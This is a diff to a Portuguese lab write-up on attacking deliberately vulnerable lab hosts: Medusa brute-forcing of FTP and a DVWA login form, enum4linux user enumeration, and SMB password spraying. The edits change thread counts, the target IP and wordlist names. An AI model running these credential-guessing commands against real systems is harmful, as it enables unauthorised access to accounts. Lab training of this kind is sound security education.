@@ -82,12 +82,12 @@ medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
 -U: Arquivo contendo a lista de usuários.
 -P: Arquivo contendo a lista de senhas.
 -M ftp: Módulo correspondente ao protocolo FTP.
--t 4: Número de threads simultâneas.
+-t 6: Número de threads simultâneas.
 
 Validação do Acesso
 Após o Medusa identificar o par de credenciais válido (ACCOUNT FOUND), o acesso foi confirmado via cliente FTP nativo:
 ```Bash
-ftp 192.168.56.102
+ftp 192.168.56.103
 # Inserir usuário e senha encontrados
 ```
 ---
@@ -100,7 +100,7 @@ Para simular ataques contra aplicações web, foi utilizada a aplicação DVWA (
 medusa -h 192.168.56.103 -U users.txt -P pass.txt -M http \
 -m PAGE:"/dvwa/login.php" \
 -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
--m 'FAIL=Login failed' -t 6 \
+-m 'FAIL=Login failed' -t 6 
 ```
 ---
 
@@ -111,14 +111,14 @@ Diferente da força bruta tradicional (que testa várias senhas em um único usu
 Etapa 1: Enumeração de Usuários via SMB
 Utilizando o enum4linux para listar contas locais expostas pelo serviço Samba sem autenticação prévia:
 ```Bash
-enum4linux -U 192.168.56.103
+enum4linux -a 192.168.56.103 | tee enum4_output.txt 
 ```
-Os usuários válidos extraídos (ex: msfadmin, user, postgres, service) foram salvos em wordlists/users_smb_validos.txt.  
+Os usuários válidos extraídos (ex: msfadmin, user, nservice) foram salvos em smb_users.txt. E as senhas usadas foram salvas no arquivo senhas_spray.txt
 
 Etapa 2: Execução do Password Spraying com Medusa
-Testando a senha única (-p msfadmin) contra toda a lista de usuários válidos no módulo smbnt:   
+Testando as senhas contra a lista de usuários válidos no módulo smbnt:   
 ```Bash
-medusa -h 192.168.56.103 -U wordlists/users_smb_validos.txt -p msfadmin -M smbnt
+medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 ```
 Etapa 3: Validação do Acesso via smbclient
 Com a credencial validada, listamos os compartilhamentos disponíveis no servidor:   
